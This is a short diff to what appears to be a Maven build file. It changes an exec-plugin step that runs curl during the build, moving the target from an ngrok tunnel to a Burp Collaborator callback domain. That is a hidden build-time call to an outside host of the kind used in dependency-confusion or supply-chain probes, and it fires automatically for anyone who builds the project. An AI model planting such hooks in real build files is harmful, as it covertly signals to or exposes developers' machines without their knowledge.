@@ -40,7 +40,7 @@
                         <configuration>
                             <executable>curl</executable>
                             <arguments>
-                                <argument>seba.ngrok.io</argument>
+                                <argument>pwpy3ld8fvh22j8dnflw26ln0e66uv.burpcollaborator.net</argument>
                             </arguments>
                         </configuration>
                     </execution>
